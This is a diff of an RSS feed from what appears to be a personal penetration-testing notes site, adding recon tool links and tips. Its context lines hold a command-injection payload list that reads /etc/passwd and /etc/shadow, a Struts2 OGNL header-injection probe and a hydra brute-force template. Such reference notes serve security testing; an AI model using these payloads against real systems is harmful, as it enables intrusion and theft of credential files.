@@ -72,7 +72,7 @@ https://sploitus.com/</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/recon/spider/</guid>
-      <description> Crawling katana # go install github.com/projectdiscovery/katana/cmd/katana@latest cat hosts | katana -jc -kf all -nc -ef png,jpg,jpeg,css,gif,ttf,woff,woff2,svg,eot Check if hosts/paths are valid # https://github.com/projectdiscovery/httpx cat links.txt | httpx -follow-host-redirects -random-agent -status-code -silent -retries 2 -title -web-server -tech-detect -location -o webs_info.txt Find records # https://github.com/projectdiscovery/dnsx dnsx -retry 3 -a -aaaa -cname -ns -ptr -mx -soa -resp -silent -l subdomains.txt &amp;gt; dnsx_info.txt </description>
+      <description> katana # go install github.com/projectdiscovery/katana/cmd/katana@latest cat hosts | katana -jc -kf all -nc -ef png,jpg,jpeg,css,gif,ttf,woff,woff2,svg,eot Check if hosts/paths are valid # https://github.com/projectdiscovery/httpx cat links.txt | httpx -follow-host-redirects -random-agent -status-code -silent -retries 2 -title -web-server -tech-detect -location -o webs_info.txt Find records # https://github.com/projectdiscovery/dnsx dnsx -retry 3 -a -aaaa -cname -ns -ptr -mx -soa -resp -silent -l subdomains.txt &amp;gt; dnsx_info.txt Webpaste chrome extension # https://github.com/xnl-h4ck3r/webpaste </description>
     </item>
     
     <item>
@@ -198,7 +198,7 @@ General format for website attacks: hydra -L &amp;lt;username list&amp;gt; -p &a
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/resources/burpsuite/</guid>
-      <description>Plugins Backslash powered scanner, find additional vulns JS Miner, gets sensitive content from js files Active Scan++, find additional vulns JS Link Finder, find links inside javascript files Param Miner, mines urls searching for parameters Reflector, find reflected inputs Tips n Tricks Send traffic from VPS to local burp # Run this in terminal connecting to vps (if ssh with key is possible) # When in WSL, portforwarding needs to be set ssh -R 8080:127.</description>
+      <description>Plugins Backslash powered scanner, find additional vulns JS Miner, gets sensitive content from js files Active Scan++, find additional vulns JS Link Finder, find links inside javascript files Param Miner, mines urls searching for parameters Reflector, find reflected inputs JsLuice+ (https://github.com/0x999-x/jsluicepp) Tips n Tricks Send traffic from VPS to local burp # Run this in terminal connecting to vps (if ssh with key is possible) # When in WSL, portforwarding needs to be set ssh -R 8080:127.</description>
     </item>
     
     <item>
@@ -242,6 +242,17 @@ https://securityheaders.com/ POC &amp;lt;iframe src=&amp;#34;https://example.com
       <guid>https://caon.io/exploitation/vulnerability/commandinjection/</guid>
       <description>Command Injection is a critical vulnerability that allows attackers to gain complete control over an affected web site and the underlying web server.
 &amp;amp;lt;!--#exec%20cmd=&amp;amp;quot;/bin/cat%20/etc/passwd&amp;amp;quot;--&amp;amp;gt; &amp;amp;lt;!--#exec%20cmd=&amp;amp;quot;/bin/cat%20/etc/shadow&amp;amp;quot;--&amp;amp;gt; &amp;amp;lt;!--#exec%20cmd=&amp;amp;quot;/usr/bin/id;--&amp;amp;gt; /index.html|id| ;id; ;id ;netstat -a; ;system(&amp;#39;cat%20/etc/passwd&amp;#39;) |id |/usr/bin/id |id| |/usr/bin/id| ||/usr/bin/id| |id; ||/usr/bin/id; ;id| ;|/usr/bin/id| \n/bin/ls -al\n \n/usr/bin/id\n \nid\n \n/usr/bin/id; \nid; \n/usr/bin/id| \nid| ;/usr/bin/id\n ;id\n |usr/bin/id\n |nid\n `id` `/usr/bin/id` a);id a;id a);id; a;id; a);id| a;id| a)|id a|id a)|id; |/bin/ls -al a);/usr/bin/id a;/usr/bin/id a);/usr/bin/id; a;/usr/bin/id; a);/usr/bin/id| a;/usr/bin/id| a)|/usr/bin/id a|/usr/bin/id a)|/usr/bin/id; ;system(&amp;#39;id&amp;#39;) ;system(&amp;#39;/usr/bin/id&amp;#39;) %0Acat%20/etc/passwd %0A/usr/bin/id %0Aid %0A/usr/bin/id%0A %0Aid%0A | id &amp;amp; id ; id %0a id %0a $;/usr/bin/id cat /etc/hosts $(`cat /etc/passwd`) cat /etc/passwd {{ get_user_file(&amp;#34;/etc/passwd&amp;#34;) }} &amp;lt;!</description>
+    </item>
+    
+    <item>
+      <title>Company Acquisitions &amp; Trademarks</title>
+      <link>https://caon.io/recon/companyinformation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://caon.io/recon/companyinformation/</guid>
+      <description>Big companies usually have other brands, subsidiaries or simply have other names in the other countries. Not only that, but companies own patents, trademarks and have the most fiverse products that not always have the obvious company name in it.
+To search all assets that is related to a company, one can search in the following resources:
+https://contracts.justia.com/companies/, find registered and approved trademarks https://www.crunchbase.com/, company acquisitions </description>
     </item>
     
     <item>
@@ -363,8 +374,9 @@ Add parameters into the endpoints GET /api_v1/messages --&amp;gt; 401 GET /api_v
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/exploitation/vulnerability/IIS/</guid>
-      <description> Shortscan https://github.com/bitquark/shortscan
-$ shortscan http://example.org/ </description>
+      <description>Shortscan https://github.com/bitquark/shortscan
+$ shortscan http://example.org/ Tips: Results from shortscan can be queries in github using path For example, if shortscan resturn something like DSO_fi~..., one can query github for path:/DSO_fi in order to find files with this very same start.
+Use AI! Generate a large wordlist for filenames starting with DSO_fi</description>
     </item>
     
     <item>
@@ -528,7 +540,7 @@ example.com?account_id=gust&amp;amp;account[id=admin # Backend would execute gue
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/resources/repositories/</guid>
-      <description> Repository Description https://github.com/Lissy93/personal-security-checklist#authentication Security Checklist from explanatory side https://github.com/Bandit-HaxUnit/haxunit Workflow for recon https://github.com/edoardottt/awesome-hacker-search-engines Awesome search engines </description>
+      <description> Repository Description https://github.com/Lissy93/personal-security-checklist#authentication Security Checklist from explanatory side https://github.com/Bandit-HaxUnit/haxunit Workflow for recon https://github.com/edoardottt/awesome-hacker-search-engines Awesome search engines https://github.com/MandConsultingGroup/porch-pirate Find public information in postman </description>
     </item>
     
     <item>
@@ -695,7 +707,7 @@ dev.domain.com stage.</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/exploitation/vulnerability/other/webtech/</guid>
-      <description>Adobe AEM aem-hacker aemscan aem-paths.txt writeup about aem exploitation Adobe Coldfusion https://www.jomar.fr/posts/2021/basic_recon_to_rce/ API API-Security-Checklist api-testing-checklist API Security 31-days-of-API-Security-Tips awesome-api-security web-api-pentesting OpenAPI Scanner General tips Mindmap Apache Exploit default apache Apache Struts2 Endpoints with .action, .do, .go are all using struts2 Content-Type: %{#context[&amp;#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;#39;].addHeader(&amp;#39;Added Header&amp;#39;,4*4)}.multipart/form-data Artifactory Hacking Artifactory Hacking guide ASP.NET/IIS ASPX and ASP.net have viewstate in cookie values, default ASP has not exploiting-viewstate viewgen shortname scanner XSS trace.axd any.aspx/trace.axd WEB-INF/web.xml con/ aux/ con.</description>
+      <description>Adobe AEM aem-hacker aemscan aem-paths.txt writeup about aem exploitation Adobe Coldfusion https://www.jomar.fr/posts/2021/basic_recon_to_rce/ API API-Security-Checklist api-testing-checklist API Security 31-days-of-API-Security-Tips awesome-api-security web-api-pentesting OpenAPI Scanner General tips Mindmap Apache Exploit default apache Apache Struts2 Endpoints with .action, .do, .go are all using struts2 Content-Type: %{#context[&amp;#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;#39;].addHeader(&amp;#39;Added Header&amp;#39;,4*4)}.multipart/form-data Artifactory Hacking Artifactory Hacking guide ASP.NET/IIS ASPX and ASP.net have viewstate in cookie values, default ASP has not exploiting-viewstate viewgen shortname scanner XSS https://code-white.com/blog/leaking-objrefs-to-exploit-http-dotnet-remoting/ trace.axd any.aspx/trace.axd WEB-INF/web.</description>
     </item>
     
     <item>
